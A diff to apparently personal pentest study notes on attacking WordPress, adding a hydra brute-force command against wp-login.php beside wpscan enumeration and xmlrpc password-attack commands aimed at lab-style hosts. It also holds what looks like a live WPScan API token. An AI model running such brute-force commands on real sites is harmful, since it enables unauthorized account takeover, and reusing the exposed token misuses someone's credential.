@@ -3,6 +3,7 @@
 sudo wpscan --url http://10.10.13.59/ --enumerate --api-token WjrpE4gHXHSJWdMRFd65wbgll05shgqVteeasj8sK1Y  
 ## login bruteforcing
 sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local  
+hydra -l user1 -P ./rockyou.txt 10.10.212.17 http-post-form "/wp-login.php:username=^USER^&pass=^PASS^:F=<span>Wrong password"
 ### Error
 * van hogy errort dob es kiirja, hogy vigyuk lejjebb a thread-et
 * vegyuk le 1-re
